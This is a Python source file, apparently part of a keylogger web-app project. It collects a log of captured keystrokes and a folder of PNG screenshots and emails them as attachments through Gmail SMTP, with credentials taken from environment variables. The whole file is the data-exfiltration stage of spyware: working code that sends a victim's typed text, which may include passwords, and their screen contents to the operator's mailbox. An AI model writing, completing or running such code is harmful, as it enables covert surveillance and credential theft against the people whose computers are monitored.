import smtplib
import os
import mimetypes
from email.message import EmailMessage
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# Email Configuration
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 465
EMAIL_SENDER = os.getenv("SENDER_EMAIL")
EMAIL_PASSWORD = os.getenv("SENDER_PASSWORD")
EMAIL_RECEIVER = os.getenv("RECIEVER_EMAIL")

# File Paths
LOG_FILE = "E:\\Keylogger-Webapp\\backend\\logs\\keylogs.txt"
SCREENSHOT_FOLDER = "E:\\Keylogger-Webapp\\backend\\logs\\screenshots"


def send_email_report():
    try:
        msg = EmailMessage()
        msg["Subject"] = "Keylogger Report"
        msg["From"] = EMAIL_SENDER
        msg["To"] = EMAIL_RECEIVER
        msg.set_content("Attached are the latest keystroke logs and screenshots.")

        # Attach keylogs
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, "rb") as f:
                msg.add_attachment(f.read(), maintype="text", subtype="plain", filename="keystrokes.txt")
                print("✅ Attached: keylogs.txt")

        # Attach screenshots
        if os.path.exists(SCREENSHOT_FOLDER):
            screenshot_files = sorted(os.listdir(SCREENSHOT_FOLDER))
            print(f"🔍 Found screenshots: {screenshot_files}")

            for filename in screenshot_files:
                filepath = os.path.join(SCREENSHOT_FOLDER, filename)
                if os.path.isfile(filepath) and filename.endswith(".png"):
                    ctype, encoding = mimetypes.guess_type(filepath)
                    maintype, subtype = ctype.split("/", 1) if ctype else ("application", "octet-stream")

                    with open(filepath, "rb") as f:
                        msg.add_attachment(f.read(), maintype=maintype, subtype=subtype, filename=filename)
                        print(f"✅ Attached: {filename}")

        # Send Email
        with smtplib.SMTP_SSL(SMTP_SERVER, SMTP_PORT) as server:
            server.login(EMAIL_SENDER, EMAIL_PASSWORD)
            server.send_message(msg)

        print("✅ Email Sent Successfully with Multiple Screenshots!")

    except Exception as e:
        print(f"❌ Email Error: {e}")


if __name__ == "__main__":
    send_email_report()
